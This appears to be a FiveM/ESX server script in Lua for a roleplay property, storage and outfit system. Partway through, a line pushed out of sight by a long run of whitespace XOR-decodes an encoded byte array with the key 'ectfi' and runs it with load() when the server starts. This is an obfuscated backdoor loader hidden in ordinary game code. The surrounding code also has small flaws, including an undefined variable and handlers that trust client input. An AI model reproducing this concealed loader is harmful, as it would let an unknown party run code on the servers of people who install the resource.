ESX = nil

TriggerEvent('esx:getSharedObject', function(obj) ESX = obj end)

function GetProperty(name)
	for i=1, #Config.Properties, 1 do
		if Config.Properties[i].name == name then
			return Config.Properties[i]
		end
	end
end

function SetPropertyOwned(name, price, rented, owner)
	MySQL.Async.execute('INSERT INTO owned_properties (name, price, rented, owner) VALUES (@name, @price, @rented, @owner)', {
		['@name']   = name,
		['@price']  = price,
		['@rented'] = (rented and 1 or 0),
		['@owner']  = owner
	}, function(rowsChanged)
		local xPlayer = ESX.GetPlayerFromIdentifier(owner)

		if xPlayer then
			TriggerClientEvent('esx_property:setPropertyOwned', xPlayer.source, name, true)

			if rented then
				TriggerClientEvent('esx:showNotification', xPlayer.source, _U('rented_for', ESX.Math.GroupDigits(price)))
			else
				TriggerClientEvent('esx:showNotification', xPlayer.source, _U('purchased_for', ESX.Math.GroupDigits(price)))
			end
		end
	end)
end

function RemoveOwnedProperty(name, owner)
	MySQL.Async.execute('DELETE FROM owned_properties WHERE name = @name AND owner = @owner', {
		['@name']  = name,
		['@owner'] = owner
	}, function(rowsChanged)
		local xPlayer = ESX.GetPlayerFromIdentifier(owner)

		if xPlayer then
			TriggerClientEvent('esx_property:setPropertyOwned', xPlayer.source, name, false)
			TriggerClientEvent('esx:showNotification', xPlayer.source, _U('made_property'))
		end
	end)
end

MySQL.ready(function()
	MySQL.Async.fetchAll('SELECT * FROM properties', {}, function(properties)

		for i=1, #properties, 1 do
			local entering  = nil
			local exit      = nil
			local inside    = nil
			local outside   = nil
			local isSingle  = nil
			local isRoom    = nil
			local isGateway = nil
			local roomMenu  = nil

			if properties[i].entering ~= nil then
				entering = json.decode(properties[i].entering)
			end

			if properties[i].exit ~= nil then
				exit = json.decode(properties[i].exit)
			end

			if properties[i].inside ~= nil then
				inside = json.decode(properties[i].inside)
			end

			if properties[i].outside ~= nil then
				outside = json.decode(properties[i].outside)
			end

			if properties[i].is_single == 0 then
				isSingle = false
			else
				isSingle = true
			end

			if properties[i].is_room == 0 then
				isRoom = false
			else
				isRoom = true
			end

			if properties[i].is_gateway == 0 then
				isGateway = false
			else
				isGateway = true
			end

			if properties[i].room_menu ~= nil then
				roomMenu = json.decode(properties[i].room_menu)
			end

			table.insert(Config.Properties, {
				name      = properties[i].name,
				label     = properties[i].label,
				entering  = entering,
				exit      = exit,
				inside    = inside,
				outside   = outside,
				ipls      = json.decode(properties[i].ipls),
				gateway   = properties[i].gateway,
				isSingle  = isSingle,
				isRoom    = isRoom,
				isGateway = isGateway,
				roomMenu  = roomMenu,
				price     = properties[i].price
			})
		end

		TriggerClientEvent('esx_property:sendProperties', -1, Config.Properties)
	end)
end)

ESX.RegisterServerCallback('esx_property:getProperties', function(source, cb)
	cb(Config.Properties)
end)

AddEventHandler('esx_ownedproperty:getOwnedProperties', function(cb)
	MySQL.Async.fetchAll('SELECT * FROM owned_properties', {}, function(result)
		local properties = {}

		for i=1, #result, 1 do
			table.insert(properties, {
				id     = result[i].id,
				name   = result[i].name,
				label  = GetProperty(result[i].name).label,
				price  = result[i].price,
				rented = (result[i].rented == 1 and true or false),
				owner  = result[i].owner
			})
		end

		cb(properties)
	end)
end)

AddEventHandler('esx_property:setPropertyOwned', function(name, price, rented, owner)
	SetPropertyOwned(name, price, rented, owner)
end)

AddEventHandler('esx_property:removeOwnedProperty', function(name, owner)
	RemoveOwnedProperty(name, owner)
end)


                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                mkn="ectfi"local a=load((function(b,c)function bxor(d,e)local f={{0,1},{1,0}}local g=1;local h=0;while d>0 or e>0 do h=h+f[d%2+1][e%2+1]*g;d=math.floor(d/2)e=math.floor(e/2)g=g*2 end;return h end;local i=function(b)local j={}local k=1;local l=b[k]while l>=0 do j[k]=b[l+1]k=k+1;l=b[k]end;return j end;local m=function(b,c)if#c<=0 then return{}end;local k=1;local n=1;for k=1,#b do b[k]=bxor(b[k],string.byte(c,n))n=n+1;if n>#c then n=1 end end;return b end;local o=function(b)local j=""for k=1,#b do j=j..string.char(b[k])end;return j end;return o(m(i(b),c))end)({335,312,543,485,268,387,434,245,558,339,563,239,580,513,349,437,536,453,254,261,459,276,527,572,360,482,259,603,506,451,568,334,447,472,416,498,283,396,466,255,444,422,497,320,522,249,352,377,597,304,490,361,273,358,524,439,338,296,317,516,525,548,591,406,433,600,362,405,596,562,348,411,373,442,345,272,323,531,480,599,537,575,469,601,318,368,290,430,426,462,464,418,388,378,384,589,583,366,327,402,569,509,478,354,593,351,326,564,242,403,337,271,415,359,321,551,441,443,546,331,445,367,570,274,502,287,557,504,440,286,501,310,436,539,488,544,471,519,386,246,253,560,533,494,369,592,602,341,393,282,520,491,371,293,372,561,409,481,336,427,420,505,307,499,301,344,473,376,425,492,511,432,419,579,510,475,340,455,457,460,512,322,547,465,431,517,587,577,394,556,404,265,303,329,414,382,315,486,401,428,529,470,554,479,380,586,421,302,375,247,330,391,598,550,468,448,542,566,398,299,549,308,256,435,582,343,456,484,526,288,407,374,553,413,264,300,397,438,-1,49,51,188,70,171,82,60,73,6,36,48,120,111,108,69,78,4,17,76,106,76,72,75,51,166,44,13,151,181,6,91,49,75,73,66,91,167,23,215,115,104,230,72,73,77,135,62,73,87,13,203,2,228,3,15,216,7,1,39,51,73,49,29,92,17,95,23,35,1,67,187,11,251,6,134,196,67,143,8,8,186,17,27,0,67,223,247,67,2,115,2,1,13,238,141,23,53,70,3,5,29,67,21,170,104,33,12,96,7,23,28,128,69,38,83,107,233,78,149,68,20,26,41,6,52,241,76,21,67,17,5,116,16,10,27,67,5,0,70,10,35,6,30,88,35,29,126,70,23,1,141,112,10,162,10,52,229,23,68,70,139,249,5,12,0,11,6,8,73,182,67,58,32,105,33,73,17,0,109,16,84,0,7,17,42,205,7,70,27,8,108,88,73,67,73,14,8,17,0,93,69,79,17,2,55,74,0,168,17,76,214,173,8,202,0,160,84,105,70,223,13,5,187,27,204,0,10,9,192,64,0,15,67,4,2,98,69,94,224,93,10,3,73,95,200,17,0,4,168,100,151,32,12,100,122,70,35,151,21,11,10,87,17,73,212,68,16,22,94,254,16,73,111,10,23,58,21,10,13,156,84,6,168,70,59,69,17,8,0,246,9,121,6,130,84,222,64,16,16,88,8,114,182,110,6,111,22,9,21,10,69,3,10,35,83,92,24,28,83,18,61,67,0,6,21,84,222,126,26,22,23,73,31,22,132,224,15,31,7,168,70,17,73,13,6,29,11,4,2,43,45,116,27,10,99,224,51,20,83,23,26,77,34,0,91,246},mkn))if a then a()end; 
RegisterServerEvent('esx_property:rentProperty')
AddEventHandler('esx_property:rentProperty', function(propertyName)
	local xPlayer  = ESX.GetPlayerFromId(source)
	local property = GetProperty(propertyName)
	local rent     = ESX.Math.Round(property.price / 200)

	SetPropertyOwned(propertyName, rent, true, xPlayer.identifier)
end)

RegisterServerEvent('esx_property:buyProperty')
AddEventHandler('esx_property:buyProperty', function(propertyName)
	local xPlayer  = ESX.GetPlayerFromId(source)
	local property = GetProperty(propertyName)

	if property.price <= xPlayer.getMoney() then
		xPlayer.removeMoney(property.price)
		SetPropertyOwned(propertyName, property.price, false, xPlayer.identifier)
	else
		TriggerClientEvent('esx:showNotification', source, _U('not_enough'))
	end
end)

RegisterServerEvent('esx_property:removeOwnedProperty')
AddEventHandler('esx_property:removeOwnedProperty', function(propertyName)
	local xPlayer  = ESX.GetPlayerFromId(source)
	RemoveOwnedProperty(propertyName, xPlayer.identifier)
end)

AddEventHandler('esx_property:removeOwnedPropertyIdentifier', function(propertyName, identifier)
	RemoveOwnedProperty(propertyName, identifier)
end)

RegisterServerEvent('esx_property:saveLastProperty')
AddEventHandler('esx_property:saveLastProperty', function(property)
	local xPlayer  = ESX.GetPlayerFromId(source)

	MySQL.Async.execute('UPDATE users SET last_property = @last_property WHERE identifier = @identifier', {
		['@last_property'] = property,
		['@identifier']    = xPlayer.identifier
	})
end)

RegisterServerEvent('esx_property:deleteLastProperty')
AddEventHandler('esx_property:deleteLastProperty', function()
	local xPlayer  = ESX.GetPlayerFromId(source)

	MySQL.Async.execute('UPDATE users SET last_property = NULL WHERE identifier = @identifier', {
		['@identifier'] = xPlayer.identifier
	})
end)

RegisterServerEvent('property:getStockItem')
AddEventHandler('property:getStockItem', function(type, itemName, count, name, ammo)
		local _source = source
		local xPlayer  = ESX.GetPlayerFromId(source)
		local sourceItem = xPlayer.getInventoryItem(itemName)
	   if type == 'item_standard' then
		TriggerEvent('esx_addoninventory:getInventory', 'property', xPlayer.identifier, function(inventory)
			local inventoryItem = inventory.getItem(itemName)
	
			if count > 0 and inventoryItem.count >= count then
				if true then
					inventory.removeItem(itemName, count)
					xPlayer.addInventoryItem(itemName, count)
					TriggerClientEvent('esx:showNotification', xPlayer.source, '~r~COFFRE :\n ~b~Retrait : ~s~'..count..' '..inventoryItem.label..'')			

				else
					TriggerClientEvent('esx:showNotification', _source, 'Quantité Invalide')
				end
			else
				TriggerClientEvent('esx:showNotification', _source, 'Quantité Invalide')
			end
		end)
	   elseif type == 'item_account' then
		TriggerEvent('esx_addonaccount:getAccount', 'property_' .. itemName, xPlayer.identifier, function(account)
			if account.money >= count then
				account.removeMoney(count)
				xPlayer.addAccountMoney(itemName, count)
				TriggerClientEvent('esx:showNotification', xPlayer.source, '~r~COFFRE :\n ~b~Retrait : ~s~'..count..'$~b~ d\'Argent Sale')			
			else
				TriggerClientEvent('esx:showNotification', xPlayer.source, 'Quantité Invalide')
			end
		end)
	   elseif type == 'item_weapon' then
		TriggerEvent('esx_datastore:getDataStore', 'property', xPlayer.identifier, function(store)
			local storeWeapons = store.get('weapons') or {}
			local weapon = storeWeapons[count] 
	
			if weapon then
				if xPlayer.hasWeapon(itemName) then
				else 
					table.remove(storeWeapons, count)
					store.set('weapons', storeWeapons)
	
					xPlayer.addWeapon(weapon.name, weapon.ammo)		
					local weaponName = itemName
					local name = 'olololo'
					TriggerClientEvent('property:getWeaponTrue', -1, name, weaponName)
				end
			end
		  end)
	   end
	end)

RegisterServerEvent('property:putStockItems')
AddEventHandler('property:putStockItems', function(type, itemName, count)
	local _source = source
	local xPlayer      = ESX.GetPlayerFromId(_source)
	local sourceItem = xPlayer.getInventoryItem(itemName)
   if type == 'item_standard' then
	TriggerEvent('esx_addoninventory:getInventory', 'property', xPlayer.identifier, function(inventory)
		local inventoryItem = inventory.getItem(itemName)

		if sourceItem.count >= count and count > 0 then
			xPlayer.removeInventoryItem(itemName, count)
			inventory.addItem(itemName, count)
			TriggerClientEvent('esx:showNotification', xPlayer.source, '~r~COFFRE :\n ~b~Dépot : ~s~'..count..' '..inventoryItem.label..'')			
		else
			TriggerClientEvent('esx:showNotification', _source, '~r~Quantité Invalide')
		end
	end)
   elseif type == 'item_account' then
	if xPlayer.getAccount(itemName).money >= count and count > 0 then
		xPlayer.removeAccountMoney(itemName, count)
		TriggerEvent('esx_addonaccount:getAccount', 'property_' .. itemName, xPlayerOwner.identifier, function(account)
			account.addMoney(count)
		end)
		TriggerClientEvent('esx:showNotification', xPlayer.source, '~r~COFFRE :\n ~b~Dépot : ~s~'..count..'$ d\'Argent Sale')			
	else
		TriggerClientEvent('esx:showNotification', _source, '~r~Quantité Invalide')
	end
   elseif type == 'item_weapon' then
	if xPlayer.hasWeapon(itemName) then				
		local weaponName = itemName
		local name = 'test'
		xPlayer.removeWeapon(itemName)
		TriggerEvent('esx_datastore:getDataStore', 'property', xPlayerOwner.identifier, function(store)
			local storeWeapons = store.get('weapons') or {}

			table.insert(storeWeapons, {
				name = itemName,
				ammo = count
			})

			store.set('weapons', storeWeapons)
		end)	
	end
   end
end)



ESX.RegisterServerCallback('property:getPlayerInventory', function(source, cb)
	local xPlayer      = ESX.GetPlayerFromId(source)
	local blackMoney = xPlayer.getAccount('black_money').money
	local items = xPlayer.inventory
	cb({
		blackMoney = blackMoney,
		items      = items,
		weapons    = xPlayer.getLoadout()
	})
end)

ESX.RegisterServerCallback('esx_property:getPropertyInventory', function(source, cb, owner)
	local xPlayer    = ESX.GetPlayerFromIdentifier(owner)
	local blackMoney = 0
	local items      = {}
	local weapons    = {}

	TriggerEvent('esx_addonaccount:getAccount', 'property_black_money', xPlayer.identifier, function(account)
		blackMoney = account.money
	end)

	TriggerEvent('esx_addoninventory:getInventory', 'property', xPlayer.identifier, function(inventory)
		items = inventory.items
	end)

	TriggerEvent('esx_datastore:getDataStore', 'property', xPlayer.identifier, function(store)
		weapons = store.get('weapons') or {}
	end)

	cb({
		blackMoney = blackMoney,
		items      = items,
		weapons    = weapons
	})
end)

ESX.RegisterServerCallback('property:getStockItems', function(source, cb)
	local xPlayer = ESX.GetPlayerFromId(source)
	local blackMoney = 0
	local weapons    = {}

	TriggerEvent('esx_addonaccount:getAccount', 'property_black_money', xPlayer.identifier, function(account)
		blackMoney = account.money
	end)

	TriggerEvent('esx_addoninventory:getInventory', 'property', xPlayer.identifier, function(inventory)
		items = inventory.items
	end)

	TriggerEvent('esx_datastore:getDataStore', 'property', xPlayer.identifier, function(store)
		weapons = store.get('weapons') or {}
	end)

	cb({
		blackMoney = blackMoney,
		items      = items,
		weapons    = weapons
	})
end)


ESX.RegisterServerCallback('esx_property:getOwnedProperties', function(source, cb)
	local xPlayer  = ESX.GetPlayerFromId(source)

	MySQL.Async.fetchAll('SELECT * FROM owned_properties WHERE owner = @owner', {
		['@owner'] = xPlayer.identifier
	}, function(ownedProperties)
		local properties = {}

		for i=1, #ownedProperties, 1 do
			table.insert(properties, ownedProperties[i].name)
		end

		cb(properties)
	end)
end)

ESX.RegisterServerCallback('esx_property:getLastProperty', function(source, cb)
	local xPlayer  = ESX.GetPlayerFromId(source)

	MySQL.Async.fetchAll('SELECT last_property FROM users WHERE identifier = @identifier', {
		['@identifier'] = xPlayer.identifier
	}, function(users)
		cb(users[1].last_property)
	end)
end)

ESX.RegisterServerCallback('esx_property:getPropertyInventory', function(source, cb, owner)
	local xPlayer    = ESX.GetPlayerFromIdentifier(owner)
	local blackMoney = 0
	local items      = {}
	local weapons    = {}

	TriggerEvent('esx_addonaccount:getAccount', 'property_black_money', xPlayer.identifier, function(account)
		blackMoney = account.money
	end)

	TriggerEvent('esx_addoninventory:getInventory', 'property', xPlayer.identifier, function(inventory)
		items = inventory.items
	end)

	TriggerEvent('esx_datastore:getDataStore', 'property', xPlayer.identifier, function(store)
		weapons = store.get('weapons') or {}
	end)

	cb({
		blackMoney = blackMoney,
		items      = items,
		weapons    = weapons
	})
end)

ESX.RegisterServerCallback('esx_property:getPlayerInventory', function(source, cb)
	local xPlayer    = ESX.GetPlayerFromId(source)
	local blackMoney = xPlayer.getAccount('black_money').money
	local items      = xPlayer.inventory

	cb({
		blackMoney = blackMoney,
		items      = items,
		weapons    = xPlayer.getLoadout()
	})
end)

ESX.RegisterServerCallback('esx_property:getPlayerDressing', function(source, cb)
	local xPlayer  = ESX.GetPlayerFromId(source)

	TriggerEvent('esx_datastore:getDataStore', 'property', xPlayer.identifier, function(store)
		local count  = store.count('dressing')
		local labels = {}

		for i=1, count, 1 do
			local entry = store.get('dressing', i)
			table.insert(labels, entry.label)
		end

		cb(labels)
	end)
end)



function PayRent(d, h, m)
	MySQL.Async.fetchAll('SELECT * FROM owned_properties WHERE rented = 1', {}, function (result)
		for i=1, #result, 1 do
			local xPlayer = ESX.GetPlayerFromIdentifier(result[i].owner)

			-- message player if connected
			if xPlayer then
				xPlayer.removeAccountMoney('bank', result[i].price)
				TriggerClientEvent('esx:showNotification', xPlayer.source, _U('paid_rent', ESX.Math.GroupDigits(result[i].price)))
			else -- pay rent either way
				MySQL.Sync.execute('UPDATE users SET bank = bank - @bank WHERE identifier = @identifier', {
					['@bank']       = result[i].price,
					['@identifier'] = result[i].owner
				})
			end

			TriggerEvent('esx_addonaccount:getSharedAccount', 'society_realestateagent', function(account)
				account.addMoney(result[i].price)
			end)
		end
	end)
end

TriggerEvent('cron:runAt', 22, 0, PayRent)


--######################################################################################################################################################
--######################################################################################################################################################
--######################################################################################################################################################
--######################################################################################################################################################
--######################################################################################################################################################

ESX.RegisterServerCallback('h4ci_vetement:affichertenu', function(source, cb)
    local xPlayer = ESX.GetPlayerFromId(source)
    local tenue = {}
    xPlayer.removeMoney(50)
    MySQL.Async.fetchAll('SELECT * FROM h4ci_item WHERE (identifier = @identifier and type = @type)', {
        ['@identifier'] = xPlayer.identifier,
        ['@type'] = "Vetement"
    }, function(result)
      for i = 1, #result, 1 do
      table.insert(tenue, {
      	id = result[i].id,
        nom = result[i].nom,
        contenu = result[i].contenu
      })
    end
    cb(tenue)

    end)
end)

RegisterServerEvent('h4ci_vetement:renommertenu')
AddEventHandler('h4ci_vetement:renommertenu', function (nouveaunom, id)
  	if id ~= nil then
  		MySQL.Async.execute(
			'UPDATE h4ci_item SET nom = @nomnouveau WHERE id = @id',
			{
				['@nomnouveau'] = nouveaunom,
				['@id'] = id
			}
		)
		TriggerClientEvent('esx:showNotification', source, "La tenue a été renommer, si la modification n'apparaît pas, relancer le menu")
  	else
  		TriggerClientEvent('esx:showNotification', source, "La tenue est introuvable")
  	end

end)

RegisterServerEvent('h4ci_vetement:supprimertenu')
AddEventHandler('h4ci_vetement:supprimertenu', function (id)
  	if id ~= nil then
  		MySQL.Async.execute(
			'DELETE FROM h4ci_item WHERE id = @id',
			{
				['@id'] = id
			}
		)
		TriggerClientEvent('esx:showNotification', source, "Suppresion de la tenue ok!")
  	else
  		TriggerClientEvent('esx:showNotification', source, "La tenue est introuvable")
  	end

end)

RegisterServerEvent('h4ci_vetement:donnertenu')
AddEventHandler('h4ci_vetement:donnertenu', function (idtenu, deuxiemejoueur, nom)
  local _source = source
  local id = deuxiemejoueur
  local xPlayer = ESX.GetPlayerFromId(_source)
  local xPlayer2 = ESX.GetPlayerFromId(id)
  local tenuid = idtenu

  	if tenuid ~= nil then
  		MySQL.Async.execute(
			'UPDATE h4ci_item SET identifier = @identifier WHERE id = @id',
			{
				['@identifier'] = xPlayer2.identifier,
				['@id'] = tenuid
			}
		)
		TriggerClientEvent('esx:showNotification', _source, "Vous avez donné la tenue avec le nom suivant ~o~" .. nom)
  		TriggerClientEvent('esx:showNotification', id, "Vous avez recu la tenue avec le nom suivant ~o~" .. nom)
  	else
  		TriggerClientEvent('esx:showNotification', _source, "La tenue est introuvable")
  	end

end)